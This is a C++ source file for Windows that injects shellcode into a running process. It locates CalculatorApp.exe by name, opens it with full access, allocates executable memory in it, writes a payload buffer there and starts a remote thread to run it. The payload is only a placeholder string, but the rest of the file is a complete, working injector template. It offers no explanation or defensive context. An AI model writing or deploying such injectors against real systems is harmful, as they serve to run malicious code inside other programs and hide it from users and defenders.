#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

unsigned char payload[] = " <The shellcode goes here> ";

DWORD GetProcessID(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateToolhelp32Snapshot failed. Error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe)) {
        std::wcerr << L"Process32First failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD processID = 0;
    do {
        if (processName == pe.szExeFile) {
            processID = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);

    if (processID == 0) {
        std::wcout << L"Process not found." << std::endl;
    }
    else {
        std::wcout << L"Process ID of " << processName << L" is: " << processID << std::endl;
    }

    return processID;
}

int main() {
    std::wstring processName = L"CalculatorApp.exe";
    DWORD procID = GetProcessID(processName);

    if (procID == 0) {
        std::cerr << "Failed to get process ID. Exiting." << std::endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        std::cerr << "Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (WriteProcessMemory(hProcess, remoteBuffer, payload, sizeof(payload), NULL) == 0) {
        std::cerr << "Failed to write memory in the target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (remoteThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }


    std::cout << "Shellcode injected into target process." << std::endl;

    WaitForSingleObject(remoteThread, INFINITE);
    CloseHandle(remoteThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
